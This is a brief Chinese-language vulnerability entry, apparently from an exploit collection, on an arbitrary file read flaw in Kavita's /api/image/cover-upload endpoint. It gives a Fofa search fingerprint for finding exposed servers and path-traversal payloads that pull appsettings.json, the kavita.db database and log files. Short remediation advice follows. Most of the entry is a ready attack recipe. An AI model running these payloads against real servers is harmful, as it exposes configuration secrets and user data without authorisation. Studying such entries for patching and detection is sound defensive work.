# Kavitacover-upload任意文件读取漏洞

- **系统**：Kavitacover　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="Kavita"`

**请求体 / payload**
```
1. Fofa
title="Kavita"
2、部分界面如下
3、隐患url,复现如下
/api/image/cover-upload?filename=../appsettings.json
或者下载其他文件
../../config//logs/kavita.log
../../config/kavita.db
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。